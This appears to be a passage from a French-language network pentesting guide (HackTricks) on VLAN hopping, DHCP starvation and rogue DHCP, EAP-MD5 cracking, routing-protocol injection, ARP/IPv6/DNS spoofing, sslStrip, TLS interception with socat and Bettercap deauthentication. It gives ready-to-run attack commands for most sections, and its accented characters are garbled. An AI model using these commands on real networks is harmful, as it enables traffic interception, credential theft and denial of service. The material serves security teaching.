**VoIP Hopper** prend en charge **trois** modes CDP. Le mode **sniff** inspecte les paquets r√©seau et tente de localiser l'ID VLAN. Pour l'utiliser, r√©glez le param√®tre **`-c`** sur `0`. Le mode **spoof** g√©n√®re des paquets personnalis√©s similaires √† ceux qu'un v√©ritable appareil VoIP transmettrait dans le r√©seau d'entreprise. Pour l'utiliser, r√©glez le param√®tre **`-c`** sur **`1`**. Le mode spoof avec un **paquet pr√©-fabriqu√©** envoie les m√™mes paquets qu'un t√©l√©phone IP Cisco 7971G-GE. Pour l'utiliser, r√©glez le param√®tre **`-c`** sur **`2`**.

Nous utilisons la derni√®re m√©thode car c'est l'approche la plus rapide. Le param√®tre **`-i`** sp√©cifie l'**interface** **r√©seau** de l'attaquant, et le param√®tre **`-E`** sp√©cifie le **nom de l'appareil VOIP** imit√©. Nous avons choisi le nom SEP001EEEEEEEEE, qui est compatible avec le format de nommage Cisco pour les t√©l√©phones VoIP. Le format se compose du mot "SEP" suivi d'une adresse MAC. Dans les environnements d'entreprise, vous pouvez imiter un appareil VoIP existant en regardant l'√©tiquette MAC au dos du t√©l√©phone ; en appuyant sur le bouton Param√®tres et en s√©lectionnant l'option Informations sur le mod√®le sur l'√©cran d'affichage du t√©l√©phone ; ou en branchant le c√¢ble Ethernet de l'appareil VoIP sur votre ordinateur portable et en observant les requ√™tes CDP de l'appareil √† l'aide de Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si l'outil s'ex√©cute avec succ√®s, **le r√©seau VLAN attribuera une adresse IPv4 √† l'appareil de l'attaquant**.

### Attaques DHCP

#### √ânum√©ration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Deux types de DoS** peuvent √™tre ex√©cut√©s contre des serveurs DHCP. Le premier consiste √† **simuler suffisamment de faux h√¥tes pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les r√©ponses du serveur DHCP et compl√©ter le protocole (**Discover** (Comp) --> **Offer** (serveur) --> **Request** (Comp) --> **ACK** (serveur)). Par exemple, cela n'est **pas possible dans les r√©seaux Wifi**.

Une autre mani√®re de r√©aliser un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque adresse IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une mani√®re plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pourriez utiliser les attaques DoS mentionn√©es pour forcer les clients √† obtenir de nouveaux baux dans l'environnement, et √©puiser les serveurs l√©gitimes afin qu'ils deviennent non r√©actifs. Ainsi, lorsque les l√©gitimes essaient de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionn√©es dans l'attaque suivante**.

#### D√©finir des valeurs malveillantes

Vous pouvez utiliser le script DHCP de Responder (_/usr/share/responder/DHCP.py_) pour √©tablir un serveur DHCP malveillant. Configurer une passerelle malveillante n'est pas id√©al, car la connexion d√©tourn√©e est seulement en half-duplex (c'est-√†-dire, nous capturons les paquets sortants du client, mais pas les r√©ponses de la passerelle l√©gitime). En tant que tel, je recommanderais de configurer un serveur DNS ou WPAD malveillant pour capturer le trafic HTTP et les identifiants en particulier.

| Description                                 | Exemple                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Notre adresse IP, annonc√©e comme une passerelle     | _-i 10.0.0.100_                                                              |
| Le nom de domaine DNS local (optionnel)        | _-d example.org_                                                             |
| Adresse IP du routeur/passerelle original   | _-r 10.0.0.1_                                                                |
| Adresse IP du serveur DNS principal               | _-p 10.0.0.100_                                                              |
| Adresse IP du serveur DNS secondaire (optionnel)  | _-s 10.0.0.1_                                                                |
| Le masque de r√©seau local            | _-n 255.255.255.0_                                                           |
| L'interface pour √©couter le trafic DHCP sur | _-I eth1_                                                                    |
| Adresse de configuration WPAD (URL)            | _-w ‚Äú_[http://10.0.0.100/wpad.dat\n‚Äù](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Usurper l'adresse IP de la passerelle par d√©faut        | -S                                                                           |
| R√©pondre √† toutes les demandes DHCP (tr√®s bruyant)   | -R                                                                           |

### **Attaques EAP**

Voici certaines des tactiques d'attaque qui peuvent √™tre utilis√©es contre les impl√©mentations 802.1X :

* Brute-force actif des mots de passe via EAP
* Attaquer le serveur RADIUS avec du contenu EAP malform√© _\*\*_(exploits)
* Capture de messages EAP et craquage de mot de passe hors ligne (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic r√©seau malveillant apr√®s authentification en utilisant un hub ou similaire

Si l'attaquant est entre la victime et le serveur d'authentification, il pourrait essayer de d√©grader (si n√©cessaire) le protocole d'authentification √† EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait forcer le brute-force en utilisant :
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles r√©seau con√ßus pour **cr√©er un syst√®me de routage redondant √† chaud**. Avec FHRP, des routeurs physiques peuvent √™tre combin√©s en un seul appareil logique, ce qui augmente la tol√©rance aux pannes et aide √† r√©partir la charge.

**Des ing√©nieurs de Cisco Systems ont d√©velopp√© deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Il existe trois versions du protocole d'information de routage (RIP) : RIP, RIPv2 et RIPng. RIP et RIPv2 utilisent des datagrammes UDP envoy√©s aux pairs via le port 520, tandis que RIPng diffuse des datagrammes sur le port UDP 521 via multicast IPv6. RIPv2 a introduit le support de l'authentification MD5. RIPng n'int√®gre pas d'authentification native ; il repose plut√¥t sur des en-t√™tes IPsec AH et ESP optionnels au sein d'IPv6.

Pour plus d'informations sur comment attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3√®me √©dition).**_

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole vectoriel de distance.** S'il n'y a **pas d'authentification** et de configuration d'interfaces passives, un **intrus** peut interf√©rer avec le routage EIGRP et provoquer un **empoisonnement des tables de routage**. De plus, le r√©seau EIGRP (en d'autres termes, le syst√®me autonome) **est plat et n'a pas de segmentation en zones**. Si un **attaquant injecte une route**, il est probable que cette route se **propagera** dans tout le syst√®me autonome EIGRP.

Pour attaquer un syst√®me EIGRP, il faut **√©tablir un voisinage avec un routeur EIGRP l√©gitime**, ce qui ouvre de nombreuses possibilit√©s, de la reconnaissance de base √† diverses injections.

\*\*\*\*[**FRRouting**](https://frrouting.org/) vous permet d'impl√©menter **un routeur virtuel qui prend en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Tout ce que vous avez √† faire est de le d√©ployer sur le syst√®me de l'attaquant et vous pouvez r√©ellement pr√©tendre √™tre un routeur l√©gitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) prend √©galement en charge la capture des diffusions EIGRP et l'injection de paquets pour manipuler la configuration de routage. Pour plus d'infos sur comment l'attaquer avec Coly, consultez _**Network Security Assessment: Know Your Network (3√®me √©dition).**_

### OSPF

La plupart des impl√©mentations d'Open Shortest Path First (OSPF) utilisent MD5 pour fournir une authentification entre les routeurs. Loki et John the Ripper peuvent capturer et attaquer les hachages MD5 pour r√©v√©ler la cl√©, qui peut ensuite √™tre utilis√©e pour annoncer de nouvelles routes. Les param√®tres de la route sont d√©finis en utilisant l'onglet _Injection_, et la cl√© est d√©finie sous _Connection_.

Pour plus d'informations sur comment attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3√®me √©dition).**_

### Autres outils et sources g√©n√©riques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour analyser le trafic r√©seau et trouver des vuln√©rabilit√©s
* Vous pouvez trouver plus d'informations sur les attaques r√©seau [ici](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO : Lire le tout et ajouter de nouvelles attaques si n√©cessaire)_

## **Spoofing**

L'attaquant configure tous les param√®tres r√©seau (GW, IP, DNS) du nouveau membre du r√©seau en envoyant de fausses r√©ponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consultez la [section pr√©c√©dente](./#arp-spoofing).

### ICMPRedirect

ICMPRedirect consiste √† envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur chemin pour atteindre une IP. Ensuite, lorsque la victime souhaite contacter l'IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### Spoofing DNS

L'attaquant r√©soudra certains (ou tous) les domaines que la victime demande.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Il existe souvent plusieurs itin√©raires vers des syst√®mes et des r√©seaux. Apr√®s avoir √©tabli une liste d'adresses MAC au sein du r√©seau local, utilisez _gateway-finder.py_ pour identifier les h√¥tes qui prennent en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Usurpation de LLMNR, NBT-NS et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les syst√®mes Microsoft utilisent la r√©solution de noms multicast de port√©e locale (LLMNR) et le service de noms NetBIOS (NBT-NS) pour la r√©solution d'h√¥tes locaux lorsque les recherches DNS √©chouent. Apple Bonjour et les impl√©mentations de configuration z√©ro Linux utilisent le DNS multicast (mDNS) pour d√©couvrir les syst√®mes au sein d'un r√©seau. Ces protocoles sont non authentifi√©s et diffusent des messages via UDP ; ainsi, les attaquants peuvent les exploiter pour diriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par les h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment usurper des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Usurpation de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

De nombreux navigateurs utilisent la d√©couverte automatique de proxy Web (WPAD) pour charger les param√®tres de proxy √† partir du r√©seau. Un serveur WPAD fournit les param√®tres de proxy client via une URL particuli√®re (par exemple, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) apr√®s avoir √©t√© identifi√© par l'un des suivants :

* DHCP, en utilisant une entr√©e de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, en recherchant le nom d'h√¥te _wpad_ dans le domaine local
* Microsoft LLMNR et NBT-NS (en cas d'√©chec de la recherche DNS)

Responder automatise l'attaque WPAD‚Äîex√©cutant un proxy et dirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.\
Lisez ici plus d'informations sur [comment usurper des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Usurpation d'appareils SSDP et UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez offrir diff√©rents services dans le r√©seau pour essayer de **tromper un utilisateur** afin qu'il entre des **identifiants en texte clair**. **Plus d'informations sur cette attaque dans** [**Usurpation d'appareils SSDP et UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Usurpation de voisin IPv6

Cette attaque est tr√®s similaire √† l'usurpation ARP mais dans le monde IPv6. Vous pouvez faire croire √† la victime que l'IPv6 de la passerelle a la MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding d'annonces de routeur IPv6

Certains syst√®mes d'exploitation configurent par d√©faut la passerelle √† partir des paquets RA envoy√©s dans le r√©seau. Pour d√©clarer l'attaquant comme routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Par d√©faut, certains syst√®mes d'exploitation tentent de configurer le DNS en lisant un paquet DHCPv6 sur le r√©seau. Ensuite, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer lui-m√™me comme DNS. Le DHCP fournit √©galement une IPv6 √† la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (page factice et injection de code JS)

## Attaques Internet

### sslStrip

En gros, ce que fait cette attaque, c'est que si **l'utilisateur** essaie d'**acc√©der** √† une page **HTTP** qui est **redirig√©e** vers la version **HTTPS**, **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur**, donc il pourra **renifler** la connexion en **texte clair**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'informations [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **diff√©rence** entre **sslStrip+ et dns2proxy** et **sslStrip** est qu'ils vont **rediriger**, par exemple, _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez l'**ajout** d'un "**w**") et d√©finiront l'**adresse de ce domaine √† l'IP de l'attaquant**. Ainsi, le **client** se **connectera** √† _**wwww.facebook.com**_ **(l'attaquant)** mais en coulisse, **sslstrip+** va **maintenir** la **connexion r√©elle** via https avec **www.facebook.com**.

L'**objectif** de cette technique est d'**√©viter HSTS** car _**wwww**.facebook.com_ **ne sera pas** enregistr√© dans le **cache** du navigateur, donc le navigateur sera tromp√© pour effectuer l'**authentification facebook en HTTP**.\
Notez que pour r√©aliser cette attaque, la victime doit initialement essayer d'acc√©der √† [http://www.faceook.com](http://www.faceook.com) et non en https. Cela peut √™tre fait en modifiant les liens √† l'int√©rieur d'une page http.

Plus d'informations [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionnent plus. Cela est d√ª au fait qu'il y a des r√®gles HSTS pr√©enregistr√©es dans les navigateurs, donc m√™me si c'est la premi√®re fois qu'un utilisateur acc√®de √† un domaine "important", il y acc√©dera via HTTPS. De plus, notez que les r√®gles pr√©enregistr√©es et d'autres r√®gles g√©n√©r√©es peuvent utiliser le flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple de** _**wwww.facebook.com**_ **mentionn√© pr√©c√©demment ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, usine

## √âcoute TCP sur le port
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## √âcoute TCP + SSL sur le port

#### G√©n√©rer des cl√©s et un certificat auto-sign√©
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### √âcouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### √âcoutez en utilisant un certificat et redirigez vers les h√¥tes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client v√©rifie que l'AC est valide, vous pourriez **servir un certificat d'un autre nom d'h√¥te sign√© par une AC**.\
Un autre test int√©ressant consiste √† servir un **certificat du nom d'h√¥te demand√© mais auto-sign√©**.

D'autres tests √† effectuer consistent √† essayer de signer le certificat avec un certificat valide qui n'est pas une AC valide. Ou √† utiliser la cl√© publique valide, forcer l'utilisation d'un algorithme comme Diffie-Hellman (un qui ne n√©cessite pas de d√©chiffrer quoi que ce soit avec la vraie cl√© priv√©e) et, lorsque le client demande une preuve de la vraie cl√© priv√©e (comme un hash), envoyer une fausse preuve et esp√©rer que le client ne v√©rifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes sur la d√©couverte active

Prenez en compte que lorsqu'un paquet UDP est envoy√© √† un appareil qui n'a pas le port demand√©, un ICMP (Port Inatteignable) est envoy√©.

### **D√©couverte ARP**

Les paquets ARP sont utilis√©s pour d√©couvrir quelles IPs sont utilis√©es √† l'int√©rieur du r√©seau. Le PC doit envoyer une demande pour chaque adresse IP possible et seules celles qui sont utilis√©es r√©pondront.

### **mDNS (DNS multicast)**

Bettercap envoie une requ√™te mDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local** la machine qui voit ce paquet r√©pond g√©n√©ralement √† cette demande. Ensuite, il recherche uniquement les machines r√©pondant √† "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (Serveur de Noms NetBios)**

Bettercap diffuse des paquets vers le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap diffuse des paquets SSDP √† la recherche de tout type de services (Port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap diffuse des paquets WSD √† la recherche de services (Port UDP 3702).

## R√©f√©rences

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce pour les chasseurs de bugs** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de chasse aux bugs cr√©√©e par des hackers, pour des hackers ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
